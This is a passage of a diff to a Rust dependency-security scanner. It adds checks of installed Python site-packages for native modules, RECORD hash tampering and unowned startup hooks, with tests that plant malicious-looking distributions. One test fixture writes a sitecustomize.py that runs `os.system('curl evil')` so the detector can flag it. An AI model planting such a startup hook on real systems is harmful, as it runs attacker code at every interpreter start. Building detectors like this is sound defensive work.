+/// native modules (package -> subpackage nesting is shallow in practice).
+const MAX_NATIVE_WALK_DEPTH: usize = 12;
+
+/// Walk a `site-packages` root for native modules (`.so`/`.dylib`/`.pyd`/`.node`),
+/// read each whole (no-follow, capped), build an A4-style buffered handoff, and run
+/// B7 triage. Folds the granular native signals, execution edges, and any correlated
+/// `NativeImportExecutionChain` finding into `report`. An UNOWNED native module
+/// (owned by no distribution's RECORD) is a known-malicious-grade corroborator, so
+/// it forces the corroboration leg even without a runtime/sibling/path string.
+fn scan_native_modules(
+    site: &Path,
+    index: &crate::artifact::record::OwnershipIndex,
+    report: &mut InstalledIntegrityReport,
+) {
+    use crate::artifact::archive::NativeMemberHandoff;
+    use crate::artifact::native::triage_native;
+    use crate::artifact::record::NormalizedInstalledPath;
+    use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
+    use crate::location::SubjectLocation;
+    use crate::util::OpenRegularError;
+
+    // Collect native-module paths via a bounded, iterative (non-recursive) walk so
+    // depth and entry count are explicitly capped. We never follow symlinked
+    // directories (we only descend real dirs reported by `read_dir`, and the file
+    // read is no-follow).
+    let mut native_paths: Vec<PathBuf> = Vec::new();
+    let mut stack: Vec<(PathBuf, usize)> = vec![(site.to_path_buf(), 0)];
+    while let Some((dir, depth)) = stack.pop() {
+        if native_paths.len() >= MAX_NATIVE_MODULES_PER_SITE {
             break;
         }
-        if let Some(rest) = line.strip_prefix("Name:") {
-            let val = rest.trim();
-            if !val.is_empty() && is_plausible_package_name(val) {
-                name = Some(val.to_string());
+        let Ok(rd) = std::fs::read_dir(&dir) else {
+            continue;
+        };
+        let mut entries: Vec<PathBuf> = rd.filter_map(Result::ok).map(|e| e.path()).collect();
+        entries.sort();
+        for entry in entries {
+            if native_paths.len() >= MAX_NATIVE_MODULES_PER_SITE {
+                break;
             }
-        } else if let Some(rest) = line.strip_prefix("Version:") {
-            let val = rest.trim();
-            if !val.is_empty() {
-                version = Some(val.to_string());
+            // `symlink_metadata` does not follow the link, so a symlinked directory
+            // is seen as a symlink (we skip descending it) and a symlinked file is
+            // still read no-follow below (the opener rejects it).
+            let Ok(meta) = std::fs::symlink_metadata(&entry) else {
+                continue;
+            };
+            if meta.file_type().is_dir() && depth < MAX_NATIVE_WALK_DEPTH {
+                stack.push((entry, depth + 1));
+            } else if meta.file_type().is_file() && is_native_module_path(&entry) {
+                native_paths.push(entry);
             }
         }
     }
-    name.map(|n| (n, version))
+    native_paths.sort();
+
+    for path in native_paths {
+        // Read the whole module (no-follow, capped). A module OVER the native-parse
+        // cap, a symlinked/non-regular final component, or an I/O error leaves the
+        // module UNINSPECTED. Do not skip silently and do not fabricate an execution
+        // entry: record an HONEST Low-confidence "uninspectable native module" signal
+        // (a partial-coverage marker, not a danger leg) so the gap is visible. The
+        // installed walk does not stream above-cap members (the archive reader owns
+        // that path), so the size-cap case is a real coverage gap here. A vanished
+        // file (a race with the walk) is a benign gap and stays silent. This signal
+        // path does NOT increment `native_modules_triaged`: the module was not
+        // triaged, and counting it would overstate coverage.
+        let bytes = match crate::util::read_text_no_follow_capped(&path, MAX_NATIVE_MODULE_BYTES) {
+            Ok(bytes) => bytes,
+            Err(OpenRegularError::NotFound) => continue,
+            Err(err) => {
+                let reason = match err {
+                    OpenRegularError::TooLarge => "the module exceeds the native-parse size cap",
+                    OpenRegularError::NotRegularFile => {
+                        "a symlinked or non-regular final component (read refused, not followed)"
+                    }
+                    OpenRegularError::Io(_) => "a permission or I/O error",
+                    OpenRegularError::NotFound => unreachable!("NotFound handled above"),
+                };
+                report.native_signals.push(ArtifactSignal {
+                    kind: ArtifactSignalKind::NativeUninspectable,
+                    location: SubjectLocation::installed(path.clone()),
+                    evidence: format!(
+                        "native module could not be triaged ({reason}); its content is unknown, \
+                         not known-clean"
+                    ),
+                    confidence: EdgeConfidence::Low,
+                });
+                continue;
+            }
+        };
+        let sha256 = {
+            use sha2::{Digest, Sha256};
+            let digest = Sha256::digest(&bytes);
+            digest
+                .iter()
+                .map(|b| format!("{b:02x}"))
+                .collect::<String>()
+        };
+        let location = SubjectLocation::installed(path.clone());
+        let handoff = NativeMemberHandoff::Buffered {
+            location: location.clone(),
+            bytes,
+            sha256,
+        };
+
+        report.native_modules_triaged += 1;
+
+        // An unowned native module (owned by no distribution's RECORD) is a strong
+        // corroborator on its own (the plan lists an unowned native executable as a
+        // High/Critical corroborator). Resolve ownership by the module's path
+        // relative to site-packages.
+        let unowned = path
+            .strip_prefix(site)
+            .ok()
+            .and_then(|rel| rel.to_str())
+            .map(|rel| !index.is_owned(&NormalizedInstalledPath::new(rel)))
+            .unwrap_or(false);
+
+        let triage = triage_native(&handoff, unowned);
+        report.native_signals.extend(triage.signals);
+        report.native_execution_edges.extend(triage.edges);
+        if let Some(finding) = triage.finding {
+            report.native_findings.push(finding);
+        }
+    }
+}
+
+/// Whether a path names a native module by extension (`.so`/`.dylib`/`.pyd`/
+/// `.node`), including a versioned ELF shared object (`libfoo.so.3`,
+/// `libbar.so.1.2.3`). Mirrors the archive reader's `NativeModule` classification.
+fn is_native_module_path(path: &Path) -> bool {
+    let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
+        return false;
+    };
+    let lower = name.to_ascii_lowercase();
+    lower.ends_with(".dylib")
+        || lower.ends_with(".pyd")
+        || lower.ends_with(".node")
+        || is_versioned_so(&lower)
+}
+
+/// Whether `name` (already lowercased) matches `*.so` with an optional trailing
+/// numeric version chain, i.e. `\.so(\.\d+)*$`: `foo.so`, `libcrypto.so.3`,
+/// `libfoo.so.1.2.3`. Anchored at the END: trailing `.<digits>` segments are
+/// stripped first, then the remainder must end in `.so`, so `foo.sober` and a
+/// non-numeric suffix like `foo.so.dev` do not match.
+fn is_versioned_so(name: &str) -> bool {
+    // Strip trailing `.<digits>` version segments (`.3`, `.1.2.3`).
+    let mut base = name;
+    while let Some((head, last)) = base.rsplit_once('.') {
+        if last.is_empty() || !last.bytes().all(|b| b.is_ascii_digit()) {
+            break;
+        }
+        base = head;
+    }
+    base.ends_with(".so")
+}
+
+/// Discover every `<name>-<version>.dist-info` directory in a `site-packages`
+/// root, returning each with its `DistributionIdentity` (read from METADATA).
+fn discover_dist_infos(site: &Path) -> Vec<(PathBuf, crate::artifact::DistributionIdentity)> {
+    use crate::artifact::DistributionIdentity;
+    use crate::location::SubjectLocation;
+
+    let mut out: Vec<(PathBuf, DistributionIdentity)> = Vec::new();
+    let Ok(rd) = std::fs::read_dir(site) else {
+        return out;
+    };
+    let mut dist_infos: Vec<PathBuf> = rd
+        .filter_map(Result::ok)
+        .map(|e| e.path())
+        .filter(|p| {
+            p.is_dir()
+                && p.file_name()
+                    .and_then(|n| n.to_str())
+                    .is_some_and(|n| n.ends_with(".dist-info"))
+        })
+        .collect();
+    dist_infos.sort();
+    for dist_info in dist_infos {
+        let metadata = dist_info.join("METADATA");
+        let (name, version) = match read_dist_info_metadata(&metadata) {
+            Some(nv) => nv,
+            // Fall back to the directory name when METADATA is unreadable, so the
+            // distribution still participates in ownership/duplicate detection.
+            None => match dist_info_dir_identity(&dist_info) {
+                Some(nv) => nv,
+                None => continue,
+            },
+        };
+        out.push((
+            dist_info.clone(),
+            DistributionIdentity {
+                ecosystem: Ecosystem::PyPI,
+                name,
+                version,
+                dist_info_path: SubjectLocation::installed(dist_info),
+            },
+        ));
+    }
+    out
+}
+
+/// Parse `<name>-<version>.dist-info` -> `(name, Some(version))` from the
+/// directory name, a fallback identity when METADATA is unreadable.
+fn dist_info_dir_identity(dist_info: &Path) -> Option<(String, Option<String>)> {
+    let dir = dist_info.file_name()?.to_str()?;
+    let stem = dir.strip_suffix(".dist-info")?;
+    let idx = stem.rfind('-')?;
+    let (name, version) = stem.split_at(idx);
+    let version = &version[1..];
+    if name.is_empty() || version.is_empty() {
+        return None;
+    }
+    Some((name.to_string(), Some(version.to_string())))
+}
+
+/// The maximum startup-hook body size read for execution analysis. A `.pth` /
+/// `.start` / `sitecustomize.py` is tiny in practice (bytes to a few KiB); cap at
+/// 1 MiB so a pathological file cannot drive an unbounded read. A body over the
+/// cap is left in the inventory but not body-analyzed.
+const MAX_STARTUP_HOOK_BYTES: u64 = 1024 * 1024;
+
+/// Scan a `site-packages` root (top level only) for startup-execution files. An
+/// unowned `sitecustomize.py`/`usercustomize.py` emits a `SitecustomizeUnowned`
+/// signal AND is recorded in `unowned_startup_hooks`; `.pth`/`.start`/`.egg-link`
+/// are recorded in `startup_inventory`. B6: the `.pth`/`.start` and
+/// `sitecustomize.py`/`usercustomize.py` BODIES are then read (no-follow, capped)
+/// and analyzed for execution content via [`crate::artifact::pth::analyze_body`],
+/// folding the granular startup signals / execution edges / cross-runtime flag
+/// into `report` for the two startup-hook correlations.
+fn scan_site_root_startup(
+    site: &Path,
+    index: &crate::artifact::record::OwnershipIndex,
+    report: &mut InstalledIntegrityReport,
+) {
+    use crate::artifact::record::NormalizedInstalledPath;
+    use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
+    use crate::location::SubjectLocation;
+
+    let Ok(rd) = std::fs::read_dir(site) else {
+        return;
+    };
+    let mut names: Vec<(String, PathBuf)> = rd
+        .filter_map(Result::ok)
+        .filter_map(|e| {
+            let p = e.path();
+            let n = p.file_name()?.to_str()?.to_string();
+            Some((n, p))
+        })
+        .collect();
+    names.sort();
+
+    for (name, path) in names {
+        let lower = name.to_ascii_lowercase();
+        if lower == "sitecustomize.py" || lower == "usercustomize.py" {
+            // Owned by a distribution? The ownership key is the file's path
+            // relative to site-packages (just its name at the root).
+            let key = NormalizedInstalledPath::new(&name);
+            if !index.is_owned(&key) {
+                report
+                    .unowned_startup_hooks
+                    .push(path.display().to_string());
+                report.signals.push(ArtifactSignal {
+                    kind: ArtifactSignalKind::SitecustomizeUnowned,
+                    location: SubjectLocation::installed(path.clone()),
+                    evidence: format!(
+                        "{name} present at the site-packages root but owned by no installed \
+                         distribution (executes at interpreter start)"
+                    ),
+                    confidence: EdgeConfidence::High,
+                });
+            }
+            // B6: analyze the sitecustomize/usercustomize MODULE body for execution
+            // content regardless of ownership (an OWNED but hostile hook still
+            // executes; ownership is a B5 corroborator, not an exemption here).
+            analyze_startup_hook_body(
+                &path,
+                crate::artifact::pth::StartupHookKind::SiteCustomize,
+                report,
+            );
+        } else if lower.ends_with(".pth") || lower.ends_with(".start") {
+            // Inventory + B6 body analysis (the executing-content surface).
+            report.startup_inventory.push(path.display().to_string());
+            let kind = if lower.ends_with(".start") {
+                crate::artifact::pth::StartupHookKind::Start
+            } else {
+                crate::artifact::pth::StartupHookKind::Pth
+            };
+            analyze_startup_hook_body(&path, kind, report);
+        } else if lower.ends_with(".egg-link") {
+            // `.egg-link` points at a project dir (one path per line); it is an
+            // editable-install pointer, not executable startup code. Inventory only.
+            report.startup_inventory.push(path.display().to_string());
+        }
+    }
+}
+
+/// Read one startup-hook body (no-follow, capped) and fold its B6 execution
+/// analysis into `report`: the granular startup signals, the execution edges
+/// (including a cross-runtime edge when a foreign runtime is launched), and the
+/// cross-runtime flag. A body that is unreadable or over [`MAX_STARTUP_HOOK_BYTES`]
+/// contributes nothing (best-effort; the inventory still records the file).
+fn analyze_startup_hook_body(
+    path: &Path,
+    kind: crate::artifact::pth::StartupHookKind,
+    report: &mut InstalledIntegrityReport,
+) {
+    use crate::artifact::{
+        ArtifactSignal, ArtifactSignalKind, EdgeConfidence, ExecutionEdge, ExecutionTrigger,
+    };
+    use crate::location::SubjectLocation;
+    use crate::util::OpenRegularError;
+
+    let bytes = match crate::util::read_text_no_follow_capped(path, MAX_STARTUP_HOOK_BYTES) {
+        Ok(bytes) => bytes,
+        // A vanished file (a race between the directory walk and the read) is a
+        // benign coverage gap with no hook left to inspect: stay silent.
+        Err(OpenRegularError::NotFound) => return,
+        // A read that was REFUSED (a symlinked / non-regular final component that
+        // O_NOFOLLOW would not open, a body over the size cap, or a permission /
+        // I/O error) leaves an inventoried startup hook UNINSPECTED. Do not treat
+        // it as clean: record a Low-confidence "uninspectable startup hook" signal
+        // so the coverage gap is visible. This does not on its own promote to a
+        // Block (it is not a danger leg in `startup_correlated_findings`), but a
+        // planted symlink or a deliberately unreadable hook is no longer silent.
+        Err(err) => {
+            let reason = match err {
+                OpenRegularError::NotRegularFile => {
+                    "a symlinked or non-regular final component (read refused, not followed)"
+                }
+                OpenRegularError::TooLarge => "the body exceeds the inspection size cap",
+                OpenRegularError::Io(_) => "a permission or I/O error",
+                OpenRegularError::NotFound => unreachable!("NotFound handled above"),
+            };
+            report.startup_signals.push(ArtifactSignal {
+                kind: ArtifactSignalKind::StartupHookUninspectable,
+                location: SubjectLocation::installed(path.to_path_buf()),
+                evidence: format!(
+                    "{} startup hook could not be inspected ({reason}); its content is unknown, \
+                     not known-clean",
+                    kind.label()
+                ),
+                confidence: EdgeConfidence::Low,
+            });
+            return;
+        }
+    };
+    // A startup hook is text; decode lossily so a stray non-UTF-8 byte does not
+    // drop the whole body (the analyzer is substring-based and tolerates it).
+    let body = String::from_utf8_lossy(&bytes);
+    let loc = SubjectLocation::installed(path.to_path_buf());
+    let analysis = crate::artifact::pth::analyze_body(&body, &loc, kind);
+
+    report.startup_signals.extend(analysis.signals);
+
+    // A plain bootstrap import emits an execution edge (startup hook imports a
+    // module, which runs its top-level code). The owning distribution is not
+    // resolved here (that is B5's ownership index / B8's cross-artifact pass); the
+    // edge records the hook -> module relationship with the module text.
+    if analysis.capabilities.cross_runtime {
+        report.startup_cross_runtime = true;
+        report.startup_execution_edges.push(ExecutionEdge {
+            from: loc.clone(),
+            trigger: ExecutionTrigger::CrossRuntimeInvocation,
+            to: SubjectLocation::default(),
+            mechanism: "startup hook launches a foreign language runtime (Bun/Node/Deno)"
+                .to_string(),
+            confidence: crate::artifact::EdgeConfidence::High,
+        });
+    }
+    // Emit a generic import edge for each executing bootstrap line (the
+    // "startup hook imports module" relationship the plan calls for), so the JSON
+    // report carries the edge even when no cross-runtime launch is present.
+    for line in &analysis.lines {
+        if line.class.executes() {
+            report.startup_execution_edges.push(ExecutionEdge {
+                from: loc.clone(),
+                trigger: kind.trigger(),
+                to: SubjectLocation::default(),
+                mechanism: format!("startup line imports/executes: {}", line.text.trim()),
+                confidence: crate::artifact::EdgeConfidence::Medium,
+            });
+        }
+    }
 }
 
 /// Walk `vendor/` for vendored Go modules (`host/owner/repo`-shaped names).
@@ -2133,7 +3153,8 @@ fn walk_vendor_go(
                 DeclaredDependency {
                     name: module.to_string(),
                     ecosystem: Ecosystem::Go,
-                    version,
+                    // `modules.txt` records the concrete resolved module version.
+                    version: lock_version_intent(version),
                     dev: false,
                 },
                 label.clone(),
@@ -2169,7 +3190,8 @@ fn walk_vendor_go(
                     DeclaredDependency {
                         name: rel,
                         ecosystem: Ecosystem::Go,
-                        version: None,
+                        // Vendored layout carries no version on disk.
+                        version: VersionIntent::Unspecified,
                         dev: false,
                     },
                     label,
@@ -2219,7 +3241,8 @@ fn parse_cargo_lock(text: &str) -> Vec<DeclaredDependency> {
             out.push(DeclaredDependency {
                 name: name.to_string(),
                 ecosystem: Ecosystem::Crates,
-                version,
+                // Cargo.lock pins a concrete resolved version.
+                version: lock_version_intent(version),
                 dev: false,
             });
         }
@@ -2256,7 +3279,7 @@ fn assess_dependency(
         ecosystem: dep.ecosystem,
         name: dep.name.clone(),
         // Manifest-declared version, carried through to OSV correlation.
-        version: dep.version.clone(),
+        version: dep.version.as_version_str().map(str::to_string),
         threat_db_missing: request.db.is_none(),
         name_vs_popular: name_vs_popular.clone(),
         malicious_typosquat_of,
@@ -2269,6 +3292,17 @@ fn assess_dependency(
 
     let slopsquat = slopsquat(&dep.name, &name_vs_popular, request.db, dep.ecosystem);
 
+    // Constraint-aware threat-DB assessment (A1e). A clean `NoRecord` is dropped
+    // so reports gain no noise; only an actual signal is stored. No-DB stays
+    // fail-open (no assessment).
+    let threat_assessment =
+        request.db.and_then(
+            |db| match db.assess_package(dep.ecosystem, &dep.name, &dep.version) {
+                PackageThreatAssessment::NoRecord => None,
+                other => Some(other),
+            },
+        );
+
     let allowlisted = (request.is_allowlisted)(dep.ecosystem, &dep.name);
 
     DependencyAssessment {
@@ -2276,6 +3310,7 @@ fn assess_dependency(
         manifest: manifest.to_string(),
         risk,
         slopsquat,
+        threat_assessment,
         allowlisted,
     }
 }
@@ -2354,7 +3389,16 @@ mod tests {
         assert_eq!(deps.len(), 3);
         let react = deps.iter().find(|d| d.name == "react").unwrap();
         assert!(!react.dev);
-        assert_eq!(react.version.as_deref(), Some("^18.0.0"));
+        // A semver range is preserved as an unresolved Constraint (its text is
+        // still reported as the version string).
+        assert_eq!(react.version.as_version_str(), Some("^18.0.0"));
+        assert!(matches!(
+            react.version,
+            VersionIntent::Constraint { parsed: None, .. }
+        ));
+        // A plain version is an exact pin.
+        let lodash = deps.iter().find(|d| d.name == "lodash").unwrap();
+        assert_eq!(lodash.version, VersionIntent::Exact("4.17.21".to_string()));
         let jest = deps.iter().find(|d| d.name == "jest").unwrap();
         assert!(jest.dev, "devDependencies must be tagged dev");
     }
@@ -2773,12 +3817,13 @@ gem 'toplevelgem'
             dependency: DeclaredDependency {
                 name: name.to_string(),
                 ecosystem: Ecosystem::Npm,
-                version: None,
+                version: VersionIntent::Unspecified,
                 dev: false,
             },
             manifest: "package.json".to_string(),
             risk: package_risk::score_package(&signals),
             slopsquat: slop,
+            threat_assessment: None,
             allowlisted,
         }
     }
@@ -2914,12 +3959,13 @@ gem 'toplevelgem'
             dependency: DeclaredDependency {
                 name: "totally-unknown-pkg".to_string(),
                 ecosystem: Ecosystem::Npm,
-                version: None,
+                version: VersionIntent::Unspecified,
                 dev: false,
             },
             manifest: "package.json".to_string(),
             risk: breakdown,
             slopsquat: SlopsquatAssessment::clear(),
+            threat_assessment: None,
             allowlisted: false,
         };
         let policy = crate::policy::Policy::default();
@@ -2974,12 +4020,13 @@ gem 'toplevelgem'
             dependency: DeclaredDependency {
                 name: "ordinary-pkg".to_string(),
                 ecosystem: Ecosystem::Npm,
-                version: None,
+                version: VersionIntent::Unspecified,
                 dev: false,
             },
             manifest: "package.json".to_string(),
             risk: breakdown,
             slopsquat: SlopsquatAssessment::clear(),
+            threat_assessment: None,
             allowlisted: false,
         };
         let policy = crate::policy::Policy::default();
@@ -3014,12 +4061,13 @@ gem 'toplevelgem'
             dependency: DeclaredDependency {
                 name: "reaqt".to_string(),
                 ecosystem: Ecosystem::Npm,
-                version: None,
+                version: VersionIntent::Unspecified,
                 dev: false,
             },
             manifest: "package.json".to_string(),
             risk: breakdown,
             slopsquat: SlopsquatAssessment::clear(),
+            threat_assessment: None,
             allowlisted: false,
         };
         // Configure a typosquat-distance policy threshold.
@@ -3230,9 +4278,103 @@ gem 'toplevelgem'
         assert_eq!(report.assessments[0].dependency.name, "evil-package");
         assert_eq!(
             report.assessments[0].dependency.version,
-            Some("1.0.0".to_string())
+            VersionIntent::Resolved("1.0.0".to_string())
         );
         assert_eq!(report.assessments[0].dependency.ecosystem, Ecosystem::Npm);
+    }
+
+    /// Build an in-memory signed threat DB whose only record is a PyPI package
+    /// `eco_name` malicious at exactly `affected` (version-specific, not
+    /// all-versions). Used to exercise the installed-METADATA path (A1e).
+    fn threat_db_with_pypi_version(eco_name: &str, affected: &str) -> ThreatDb {
+        use ed25519_dalek::SigningKey;
+        use rand_core::OsRng;
+        let key = SigningKey::generate(&mut OsRng);
+        let mut writer = crate::threatdb::ThreatDbWriter::new(1700000000, 5);
+        writer.add_package(
+            Ecosystem::PyPI,
+            eco_name,
+            &[affected],
+            crate::threatdb::ThreatSource::OssfMalicious,
+            crate::threatdb::Confidence::Confirmed,
+            false,
+            Some("https://example.com/advisory/installed"),
+        );
+        let bytes = writer.build(&key).expect("build test DB");
+        ThreatDb::from_bytes(bytes, 0).expect("load test DB")
+    }
+
+    /// Plant a `<root>/site-packages/<name>-<ver>.dist-info/METADATA` file.
+    fn plant_dist_info(root: &Path, name: &str, version: &str) {
+        let dist = root
+            .join("site-packages")
+            .join(format!("{name}-{version}.dist-info"));
+        std::fs::create_dir_all(&dist).unwrap();
+        std::fs::write(
+            dist.join("METADATA"),
+            format!("Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"),
+        )
+        .unwrap();
+    }
+
+    #[test]
+    fn installed_mode_known_malicious_metadata_blocks() {
+        // An installed distribution whose concrete version is in the malicious
+        // record is an EXACT match: it blocks via ThreatMaliciousPackage, not
+        // the unresolved warn.
+        let dir = tempfile::tempdir().unwrap();
+        plant_dist_info(dir.path(), "evil-installed", "2.3.4");
+        let db = threat_db_with_pypi_version("evil-installed", "2.3.4");
+
+        let request = ScanRequest {
+            root: dir.path(),
+            db: Some(&db),
+            online: OnlineMode::Off,
+            is_allowlisted: &never_allow,
+            mode: ScanMode::Installed,
+            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
+            policy: None,
+        };
+        let report = scan(&request);
+        assert_eq!(report.dependency_count, 1);
+        assert_eq!(report.assessments[0].dependency.name, "evil-installed");
+        assert_eq!(
+            report.assessments[0].dependency.version,
+            VersionIntent::Resolved("2.3.4".to_string())
+        );
+        assert_eq!(report.verdict.action, Action::Block);
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::ThreatMaliciousPackage),
+            "an installed affected version must block as a confirmed exact match; got {rules:?}"
+        );
+        assert!(
+            !rules.contains(&RuleId::ThreatUnresolvedMaliciousPackage),
+            "a resolved exact hit must NOT emit the unresolved warn"
+        );
+    }
+
+    #[test]
+    fn installed_mode_non_affected_metadata_is_clean() {
+        // The installed version is NOT in the malicious record, so there is no
+        // finding at all (NoRecord for this exact version).
+        let dir = tempfile::tempdir().unwrap();
+        plant_dist_info(dir.path(), "evil-installed", "9.9.9");
+        let db = threat_db_with_pypi_version("evil-installed", "2.3.4");
+
+        let request = ScanRequest {
+            root: dir.path(),
+            db: Some(&db),
+            online: OnlineMode::Off,
+            is_allowlisted: &never_allow,
+            mode: ScanMode::Installed,
+            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
+            policy: None,
+        };
+        let report = scan(&request);
+        assert_eq!(report.dependency_count, 1);
+        assert_eq!(report.verdict.action, Action::Allow);
+        assert!(report.assessments[0].threat_assessment.is_none());
     }
 
     #[test]
@@ -3485,6 +4627,988 @@ version = "1.0.61"
                 .any(|n| n.note.contains("not a recognized manifest format")),
             "must record a 'not recognized' note for an unknown file: {:?}",
             report.notes
+        );
+    }
+
+    // ---- B5: installed-distribution integrity (end-to-end via scan) -----------
+
+    /// A `sha256=<base64url-no-pad>` RECORD hash column for `bytes`.
+    fn record_hash_col(bytes: &[u8]) -> String {
+        use base64::Engine as _;
+        use sha2::{Digest, Sha256};
+        let digest = Sha256::digest(bytes);
+        format!(
+            "sha256={}",
+            base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(digest)
+        )
+    }
+
+    /// Plant a full installed PyPI distribution under `<root>/site-packages`:
+    /// a `.dist-info/METADATA`, the given package files on disk, and a RECORD
+    /// listing each file (`hash_matches` controls whether the recorded hash
+    /// matches the bytes written; `false` plants a tamper). Extra `.dist-info`
+    /// files (INSTALLER, direct_url.json) come from `extra_dist_info`. Returns the
+    /// site-packages path.
+    fn plant_installed_dist(
+        root: &Path,
+        name: &str,
+        version: &str,
+        files: &[(&str, &[u8])],
+        hash_matches: bool,
+        extra_dist_info: &[(&str, &[u8])],
+    ) -> PathBuf {
+        let site = root.join("site-packages");
+        let dist_info = site.join(format!("{name}-{version}.dist-info"));
+        std::fs::create_dir_all(&dist_info).unwrap();
+        std::fs::write(
+            dist_info.join("METADATA"),
+            format!("Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n"),
+        )
+        .unwrap();
+        for (extra_name, body) in extra_dist_info {
+            std::fs::write(dist_info.join(extra_name), body).unwrap();
+        }
+        let mut record = String::new();
+        for (rel, body) in files {
+            let p = site.join(rel);
+            if let Some(parent) = p.parent() {
+                std::fs::create_dir_all(parent).unwrap();
+            }
+            std::fs::write(&p, body).unwrap();
+            let hash_body: &[u8] = if hash_matches {
+                body
+            } else {
+                b"DIFFERENT bytes"
+            };
+            record.push_str(&format!(
+                "{rel},{},{}\n",
+                record_hash_col(hash_body),
+                body.len()
+            ));
+        }
+        // RECORD lists itself with empty hash/size.
+        record.push_str(&format!("{name}-{version}.dist-info/RECORD,,\n"));
+        std::fs::write(dist_info.join("RECORD"), record).unwrap();
+        site
+    }
+
+    fn installed_request<'a>(root: &'a Path) -> ScanRequest<'a> {
+        ScanRequest {
+            root,
+            db: None,
+            online: OnlineMode::Off,
+            is_allowlisted: &never_allow,
+            mode: ScanMode::Installed,
+            installed_max_entries: DEFAULT_MAX_INSTALLED_ENTRIES,
+            policy: None,
+        }
+    }
+
+    #[test]
+    fn integrity_tampered_file_fires_violation() {
+        let dir = tempfile::tempdir().unwrap();
+        // hash_matches: false plants a RECORD hash that disagrees with the bytes.
+        plant_installed_dist(
+            dir.path(),
+            "demo",
+            "1.0",
+            &[("demo/mod.py", b"on-disk bytes\n")],
+            false,
+            &[],
+        );
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report
+            .integrity
+            .as_ref()
+            .expect("installed mode reports integrity");
+        assert!(integrity.hash_mismatches >= 1, "a tamper must mismatch");
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "a tampered installed file must fire the integrity violation; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn integrity_unowned_sitecustomize_fires_high() {
+        let dir = tempfile::tempdir().unwrap();
+        let site = plant_installed_dist(
+            dir.path(),
+            "demo",
+            "1.0",
+            &[("demo/__init__.py", b"x = 1\n")],
+            true,
+            &[],
+        );
+        // Plant a sitecustomize.py at the site root that NO distribution owns.
+        std::fs::write(
+            site.join("sitecustomize.py"),
+            b"import os; os.system('curl evil')\n",
+        )
+        .unwrap();
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert_eq!(integrity.unowned_startup_hooks.len(), 1);
+        let finding = report
+            .verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::PythonInstalledIntegrityViolation)
+            .expect("unowned sitecustomize must fire the integrity violation");
+        // An unowned startup hook is the High corroborator -> Block.
+        assert_eq!(finding.severity, Severity::High);
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn integrity_duplicate_owned_path_fires_violation() {
+        let dir = tempfile::tempdir().unwrap();
+        let site = dir.path().join("site-packages");
+        // Two distributions whose RECORD both list the SAME module path.
+        for (name, ver) in [("alpha", "1.0"), ("beta", "2.0")] {
+            let dist_info = site.join(format!("{name}-{ver}.dist-info"));
+            std::fs::create_dir_all(&dist_info).unwrap();
+            std::fs::write(
+                dist_info.join("METADATA"),
+                format!("Metadata-Version: 2.1\nName: {name}\nVersion: {ver}\n"),
+            )
+            .unwrap();
+            // Both list `shared/mod.py` (empty hash so neither mismatches).
+            std::fs::write(dist_info.join("RECORD"), "shared/mod.py,,\n").unwrap();
+        }
+        let shared = site.join("shared");
+        std::fs::create_dir_all(&shared).unwrap();
+        std::fs::write(shared.join("mod.py"), b"shared\n").unwrap();
+
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert_eq!(
+            integrity.duplicate_owned_paths.len(),
+            1,
+            "the shared path must be detected as duplicate-owned"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(rules.contains(&RuleId::PythonInstalledIntegrityViolation));
+    }
+
+    #[test]
+    fn integrity_benign_numpy_shaped_so_no_block() {
+        // A NumPy-shaped distribution: a compiled .so LISTED in RECORD with a
+        // matching hash must not block.
+        let dir = tempfile::tempdir().unwrap();
+        plant_installed_dist(
+            dir.path(),
+            "numpyish",
+            "1.26.0",
+            &[
+                ("numpyish/__init__.py", b"from . import _core\n"),
+                (
+                    "numpyish/_core.cpython-311-x86_64-linux-gnu.so",
+                    b"\x7fELF fake\n",
+                ),
+            ],
+            true,
+            &[],
+        );
+        let report = scan(&installed_request(dir.path()));
+        assert_ne!(
+            report.verdict.action,
+            Action::Block,
+            "a NumPy-shaped dist with a listed, matching .so must not block"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "a clean compiled wheel must produce no integrity violation; got {rules:?}"
+        );
+    }
+
+    /// Build a minimal real ELF64 shared object exporting `PyInit_<sym>` with a
+    /// non-empty `.init_array` constructor and a `.rodata` carrying `rodata`
+    /// verbatim. Section-header driven so `object`'s reader accepts it; used by the
+    /// B7 live-path installed-scan tests. (A fuller builder with the full layout
+    /// math lives in `artifact::native`'s unit tests; this is the compact variant
+    /// the installed-tree test needs.)
+    fn build_min_elf_so(sym: &str, rodata: &[u8]) -> Vec<u8> {
+        // .dynstr
+        let mut dynstr: Vec<u8> = vec![0];
+        let sym_off = dynstr.len() as u32;
+        dynstr.extend_from_slice(sym.as_bytes());
+        dynstr.push(0);
+        // .dynsym: null + one GLOBAL FUNC.
+        let mut dynsym: Vec<u8> = vec![0u8; 24];
+        dynsym.extend_from_slice(&sym_off.to_le_bytes());
+        dynsym.push(0x12); // STB_GLOBAL|STT_FUNC
+        dynsym.push(0);
+        dynsym.extend_from_slice(&1u16.to_le_bytes());
+        dynsym.extend_from_slice(&0x1000u64.to_le_bytes());
+        dynsym.extend_from_slice(&0u64.to_le_bytes());
+        // .init_array: one non-zero slot (a real constructor).
